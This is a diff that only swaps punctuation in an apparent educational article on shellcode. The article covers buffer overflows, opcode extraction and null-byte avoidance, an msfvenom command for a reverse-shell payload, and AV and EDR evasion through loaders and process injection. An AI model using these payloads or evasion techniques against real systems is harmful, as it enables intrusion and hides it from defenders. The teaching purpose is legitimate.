@@ -25,7 +25,7 @@ import { Callout } from "@/components/Callout";
 
 ## Intro
 
-Picture a tiny, folded note. Slip it to the right person, and they execute its instructions blindly—no authorization, no questions asked. In the digital world, **that note is shellcode**.
+Picture a tiny, folded note. Slip it to the right person, and they execute its instructions blindly - no authorization, no questions asked. In the digital world, **that note is shellcode**.
 
 Shellcode is a small, self-contained chunk of machine code acting as the **payload** in a cyberattack. Operating without a compiler or runtime, it must be written in raw Assembly to run directly inside a vulnerable process. Tiny. Direct. Surgical.
 
@@ -41,7 +41,7 @@ The attacker's workflow is simple:
 
 ## What is a Shellcode ?
 
-Before writing shellcode, you need a clear target: _what should it do?_ The most iconic goal in exploit development is **popping a shell** — spawning an interactive `/bin/sh` on the target.
+Before writing shellcode, you need a clear target: _what should it do?_ The most iconic goal in exploit development is **popping a shell** - spawning an interactive `/bin/sh` on the target.
 
 Here is the simplest possible version of that goal, expressed in C:
 
@@ -60,11 +60,11 @@ int main()
 
 ### Why `execve`?
 
-The `execve()` system call replaces the current process image with a brand-new program — in this case, `/bin/sh`, the system shell. The CPU stops running the vulnerable application and starts running a shell instead, all inside the same process.
+The `execve()` system call replaces the current process image with a brand-new program - in this case, `/bin/sh`, the system shell. The CPU stops running the vulnerable application and starts running a shell instead, all inside the same process.
 
 Here is the critical detail that makes this dangerous: **if the target program was running with elevated privileges** (e.g., `SUID root`), the newly spawned shell **inherits those same privileges**. One shell pop and you may have root. This is the core mechanic behind the majority of privilege escalation exploits.
 
-The problem? You cannot inject C source code into a buffer overflow. The target program does not have a compiler. It only understands **machine code** — the raw bytes the CPU reads directly. That C program must first become opcodes.
+The problem? You cannot inject C source code into a buffer overflow. The target program does not have a compiler. It only understands **machine code** - the raw bytes the CPU reads directly. That C program must first become opcodes.
 
 But before we can inject anything, we need something to inject _into_. We need a vulnerability.
 
@@ -74,11 +74,11 @@ But before we can inject anything, we need something to inject _into_. We need a
 
 A **buffer overflow** is the most common vulnerability that shellcode exploits, and it has one beautifully simple root cause: **a developer trusted user input without checking its size.**
 
-A **buffer** is just a fixed block of memory — think of a 16-byte cubbyhole on the stack. If a program copies user-supplied data into that cubbyhole without verifying how much data is coming, extra bytes spill over the edges and overwrite adjacent memory that was never meant to be touched.
+A **buffer** is just a fixed block of memory - think of a 16-byte cubbyhole on the stack. If a program copies user-supplied data into that cubbyhole without verifying how much data is coming, extra bytes spill over the edges and overwrite adjacent memory that was never meant to be touched.
 
 The glass-of-water analogy is apt: pour a gallon into a 12-ounce glass and it overflows onto whatever is sitting next to it on the table.
 
-Here is a vulnerable program that would fit comfortably in a freshman CS assignment — and in a CTF beginner challenge:
+Here is a vulnerable program that would fit comfortably in a freshman CS assignment - and in a CTF beginner challenge:
 
 ```c title="vuln.c"
 #include <stdio.h>
@@ -97,13 +97,13 @@ int main()
 }
 ```
 
-The program reserves exactly 16 bytes for `input`. The `scanf("%s", ...)` call will read until it hits whitespace — which means a 200-character string will happily overwrite 184 bytes of stack memory the program never consented to share.
+The program reserves exactly 16 bytes for `input`. The `scanf("%s", ...)` call will read until it hits whitespace - which means a 200-character string will happily overwrite 184 bytes of stack memory the program never consented to share.
 
 ### From Crash to Control
 
-On its own, a buffer overflow usually ends in a program crash — the program tries to return to an address that no longer makes sense and the OS terminates it. Useful for a **denial-of-service** attack, but that is the floor, not the ceiling.
+On its own, a buffer overflow usually ends in a program crash - the program tries to return to an address that no longer makes sense and the OS terminates it. Useful for a **denial-of-service** attack, but that is the floor, not the ceiling.
 
-The real prize is **controlling what the program executes next**. The key is the **return address** — a value stored on the stack that tells the CPU where to go once the current function finishes. Overflow the buffer just far enough and you overwrite that return address with an address of your choosing. Point it at your shellcode. The function returns, the CPU jumps to your bytes, and your payload runs.
+The real prize is **controlling what the program executes next**. The key is the **return address** - a value stored on the stack that tells the CPU where to go once the current function finishes. Overflow the buffer just far enough and you overwrite that return address with an address of your choosing. Point it at your shellcode. The function returns, the CPU jumps to your bytes, and your payload runs.
 
 This is the fundamental mechanic that transforms a crash into a full remote code execution chain.
 
@@ -158,7 +158,7 @@ Three columns, three jobs:
 | **Opcodes**  | `55`, `48 89 e5`   | The **raw bytes** the CPU actually reads.  |
 | **Mnemonic** | `pushq %rbp`       | Human-readable translation of those bytes. |
 
-The opcodes are what we care about. Once we have them, we concatenate the hex bytes and prepend each with `\x` to produce a C-style byte string — the format most exploit code uses:
+The opcodes are what we care about. Once we have them, we concatenate the hex bytes and prepend each with `\x` to produce a C-style byte string - the format most exploit code uses:
 
 ```c title="shellcode_bytes.c"
 // The raw opcode stream, ready to inject
@@ -185,7 +185,7 @@ c7 45 dc 00 00 00 00    movl    $0x0, -0x24(%rbp)
 b0 00                   movb    $0x0, %al
 ```
 
-All those `00` bytes. In C-style strings, `\x00` is the **null terminator** — the character that signals "end of string." If our shellcode contains a null byte and the vulnerable function is something like `strcpy()`, it stops copying the moment it hits that `00`. The rest of our payload is silently discarded. Our carefully crafted exploit never executes.
+All those `00` bytes. In C-style strings, `\x00` is the **null terminator** - the character that signals "end of string." If our shellcode contains a null byte and the vulnerable function is something like `strcpy()`, it stops copying the moment it hits that `00`. The rest of our payload is silently discarded. Our carefully crafted exploit never executes.
 
 This is one of the most common reasons beginner shellcode "works on paper" but fails in practice.
 
@@ -196,25 +196,25 @@ This is one of the most common reasons beginner shellcode "works on paper" but f
 | Byte   | Value  | Common Reason It Breaks Payloads                                  |
 | ------ | ------ | ----------------------------------------------------------------- |
 | `\x00` | Null   | String terminator in `strcpy`, `strlen`, etc.                     |
-| `\x0a` | `LF`   | Newline — terminates input in console and HTTP contexts.          |
-| `\x0d` | `CR`   | Carriage return — terminates input in many network protocols.     |
+| `\x0a` | `LF`   | Newline - terminates input in console and HTTP contexts.          |
+| `\x0d` | `CR`   | Carriage return - terminates input in many network protocols.     |
 | `\x20` | Space  | Delimiter in command-line argument parsers.                       |
 | Varies | Custom | Application-specific filters on non-printable bytes, ranges, etc. |
 
 <Callout type="warning">
   **The Golden Rule of Shellcode:** Always identify bad characters *for your specific target* before
   finalizing your payload. A byte that is harmless in one context can silently detonate your exploit
-  in another. Test your full payload byte-by-byte against the actual injection point — never assume.
+  in another. Test your full payload byte-by-byte against the actual injection point - never assume.
 </Callout>
 
 ### Techniques for Avoiding Null Bytes
 
 Null-byte-free shellcode is an art. Common tricks in the exploit dev playbook:
 
-- **XOR a register with itself** to zero it — `xor eax, eax` produces no null bytes, while `mov eax, 0` does.
+- **XOR a register with itself** to zero it - `xor eax, eax` produces no null bytes, while `mov eax, 0` does.
 - **Use `push`/`pop`** for data moves instead of direct memory writes that embed `\x00`.
 - **Build strings on the stack at runtime** rather than referencing static data that embeds terminators.
-- **Split constants** — instead of storing `0x00000001`, push `0x01010102` and subtract `0x01010101`.
+- **Split constants** - instead of storing `0x00000001`, push `0x01010102` and subtract `0x01010101`.
 
 Mastering these tricks is what separates hand-crafted shellcode from anything a compiler spits out naively.
 
@@ -224,7 +224,7 @@ Mastering these tricks is what separates hand-crafted shellcode from anything a 
 
 Writing null-byte-free assembly by hand is the right way to _learn_. It is rarely the right way to _operate_ under time pressure in a CTF or an authorized engagement. That is where **MSFvenom** earns its keep.
 
-MSFvenom is the payload generator bundled with the Metasploit Framework. It handles bad-character encoding, multiple output formats, architecture targeting, and even multi-iteration encoding passes — all from a single command.
+MSFvenom is the payload generator bundled with the Metasploit Framework. It handles bad-character encoding, multiple output formats, architecture targeting, and even multi-iteration encoding passes - all from a single command.
 
 ### Example: Spawn `calc.exe`
 
@@ -245,7 +245,7 @@ msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00'
 
 ### CTF Classic: Staged Reverse Shell
 
-In penetration tests and CTF challenges with network interaction, the goal is often a **reverse shell** — the victim machine connects _back_ to your listener, bypassing firewall rules that might block inbound connections.
+In penetration tests and CTF challenges with network interaction, the goal is often a **reverse shell** - the victim machine connects _back_ to your listener, bypassing firewall rules that might block inbound connections.
 
 ```bash title="msfvenom_revshell.sh"
 msfvenom -p windows/x64/shell_reverse_tcp \
@@ -272,33 +272,33 @@ MSFvenom outputs a ready-to-paste C array. Drop it into your exploit script or c
 
 ## Evasion Concepts: Why Raw Shellcode Gets Caught
 
-Take the payload above and drop it onto a modern Windows machine running **Windows Defender** or a commercial EDR. It will almost certainly be flagged — not because the AV _knows_ your specific bytes, but because raw Metasploit shellcode carries **signatures**: byte patterns that have appeared in thousands of publicly documented exploits. Defenders have entire databases of them.
+Take the payload above and drop it onto a modern Windows machine running **Windows Defender** or a commercial EDR. It will almost certainly be flagged - not because the AV _knows_ your specific bytes, but because raw Metasploit shellcode carries **signatures**: byte patterns that have appeared in thousands of publicly documented exploits. Defenders have entire databases of them.
 
 ### How Detection Works
 
 Modern AV and EDR solutions combine multiple detection layers:
 
-- **Static signatures** — matching known byte sequences in files or memory dumps.
-- **Behavioral analysis** — flagging suspicious actions like spawning a reverse TCP connection from an unusual process.
-- **Memory scanning** — periodically sweeping running process memory for known shellcode patterns.
+- **Static signatures** - matching known byte sequences in files or memory dumps.
+- **Behavioral analysis** - flagging suspicious actions like spawning a reverse TCP connection from an unusual process.
+- **Memory scanning** - periodically sweeping running process memory for known shellcode patterns.
 
 Each layer catches different things. Evading all of them simultaneously is the real challenge of modern offensive operations.
 
 ### The Shift in Mindset: Execution Over Payload
 
 <Callout type="info">
-  **Pro Tip — The Letter Analogy:** If you hand a security guard a suspicious letter, they inspect
+  **Pro Tip - The Letter Analogy:** If you hand a security guard a suspicious letter, they inspect
   the letter. But if you teach someone how to *deliver* any letter without being seen, the contents
   become almost irrelevant. In shellcode terms: **it is not about making the payload invisible. It
   is about making the *act of execution* invisible.** The best Red Teamers obsess over their
   delivery mechanism, not their payload bytes.
 </Callout>
 
-### Evasion Techniques — A Theoretical Overview
+### Evasion Techniques - A Theoretical Overview
 
 #### 1. Custom Loaders
 
-Instead of injecting raw shellcode directly, operators write a **custom loader** — a program that appears benign to static scanners, allocates memory at runtime, decrypts the payload, and executes it. The loader's binary contains no recognizable signatures; the shellcode only materializes in memory at the exact moment of execution.
+Instead of injecting raw shellcode directly, operators write a **custom loader** - a program that appears benign to static scanners, allocates memory at runtime, decrypts the payload, and executes it. The loader's binary contains no recognizable signatures; the shellcode only materializes in memory at the exact moment of execution.
 
 #### 2. Memory Allocation via Windows APIs
 
@@ -326,7 +326,7 @@ int main() {
 }
 ```
 
-The shellcode lives in plaintext in memory for only a brief window before execution. Advanced EDRs hook these APIs and inspect arguments — which is why mature loaders use **indirect syscalls** or **manual unhooking** to bypass that monitoring layer.
+The shellcode lives in plaintext in memory for only a brief window before execution. Advanced EDRs hook these APIs and inspect arguments - which is why mature loaders use **indirect syscalls** or **manual unhooking** to bypass that monitoring layer.
 
 #### 3. Encryption and Encoding at Rest
 
@@ -339,15 +339,15 @@ Because static scanners see only the encrypted blob, there are no signatures to 
 
 #### 4. Process Injection
 
-Rather than running shellcode inside the loader's own process (which is newly spawned and inherently suspicious), operators inject into an already-running **legitimate process** — `notepad.exe`, `explorer.exe`, a browser tab. The shellcode runs under the cover of a trusted process identity.
+Rather than running shellcode inside the loader's own process (which is newly spawned and inherently suspicious), operators inject into an already-running **legitimate process** - `notepad.exe`, `explorer.exe`, a browser tab. The shellcode runs under the cover of a trusted process identity.
 
 Common injection techniques:
 
-- **Process Hollowing** — Spawn a legitimate process suspended, hollow out its code, replace with the payload, resume.
-- **DLL Injection** — Force a remote process to load a malicious DLL via its import mechanism.
-- **APC Injection** — Queue the payload as an Asynchronous Procedure Call on a remote thread, executed when that thread enters an alertable wait state.
+- **Process Hollowing** - Spawn a legitimate process suspended, hollow out its code, replace with the payload, resume.
+- **DLL Injection** - Force a remote process to load a malicious DLL via its import mechanism.
+- **APC Injection** - Queue the payload as an Asynchronous Procedure Call on a remote thread, executed when that thread enters an alertable wait state.
 
-Each technique pushes EDR detections further toward behavioral heuristics and away from simple byte matching — a harder, more resource-intensive problem for defenders.
+Each technique pushes EDR detections further toward behavioral heuristics and away from simple byte matching - a harder, more resource-intensive problem for defenders.
 
 ---
 
@@ -355,11 +355,11 @@ Each technique pushes EDR detections further toward behavioral heuristics and aw
 
 Shellcode is the beating heart of exploit development.
 
-It is the folded note — small enough to fit through a crack in the wall, precise enough to hand the CPU a new set of orders the moment it unfolds. From understanding how C compiles down to raw opcodes, to wrestling null bytes into submission, to generating ready-made payloads with MSFvenom, to thinking like a defender who has to stop all of it — shellcode is the thread that ties together software engineering, systems knowledge, and adversarial thinking.
+It is the folded note - small enough to fit through a crack in the wall, precise enough to hand the CPU a new set of orders the moment it unfolds. From understanding how C compiles down to raw opcodes, to wrestling null bytes into submission, to generating ready-made payloads with MSFvenom, to thinking like a defender who has to stop all of it - shellcode is the thread that ties together software engineering, systems knowledge, and adversarial thinking.
 
 ### Key Takeaways
 
-- **Learn the assembly.** You do not need to be a guru — but you need to understand how a high-level intent becomes a sequence of bytes the CPU will obey.
+- **Learn the assembly.** You do not need to be a guru - but you need to understand how a high-level intent becomes a sequence of bytes the CPU will obey.
 - **Respect bad characters.** Always characterize the injection context. A `\x0a` that is harmless in one target will silently destroy another.
 - **Use the right tools.** MSFvenom is a force multiplier. Learn its flags, encoders, and output formats cold.
 - **Think like a defender.** Understanding how AV and EDR detect shellcode makes you a better evasion engineer. Defense and offense are the same discipline, viewed from opposite chairs.
